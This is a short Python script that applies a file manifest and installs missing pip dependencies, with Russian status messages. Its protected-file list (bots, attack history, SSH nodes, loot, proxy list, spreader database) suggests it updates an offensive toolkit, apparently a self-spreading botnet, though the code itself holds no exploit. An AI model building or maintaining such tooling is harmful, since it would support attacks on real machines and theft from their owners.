import json
import os
import sys
import subprocess
import pkg_resources

MANIFEST_FILE = "manifest.json"
PROTECTED_FILES = {
    "bots.json",
    "attack_history.db",
    "secrets.json",
    "avz_state.json",
    "attack_profiles.json",
    "ssh_nodes.json",
    "avz.log",
    "loot/",
    "proxy_list.json",
    "spreader_learn.db"
}

def install_missing_dependencies(requirements_file="requirements.txt"):
    if not os.path.exists(requirements_file):
        print("[!] requirements.txt не найден")
        return
    with open(requirements_file, "r") as f:
        required_packages = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    missing = []
    for package in required_packages:
        try:
            pkg_resources.require(package)
        except (pkg_resources.DistributionNotFound, pkg_resources.VersionConflict):
            missing.append(package)
    if missing:
        print(f"[+] Установка недостающих пакетов: {', '.join(missing)}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade"] + missing)
        print("[+] Все зависимости установлены")
    else:
        print("[✓] Все зависимости уже установлены")

def apply_manifest():
    if not os.path.exists(MANIFEST_FILE):
        print("[!] manifest.json не найден")
        return
    with open(MANIFEST_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    files = data.get("files", [])
    for entry in files:
        path = entry["path"]
        content = entry["content"]
        if path in PROTECTED_FILES:
            print(f"[✓] Пропущен защищённый файл: {path}")
            continue
        dir_path = os.path.dirname(path)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"[+] Обновлён: {path}")
    install_missing_dependencies("requirements.txt")
    print("[✓] Обновление завершено. Манифест сохранён.")

if __name__ == "__main__":
    apply_manifest()
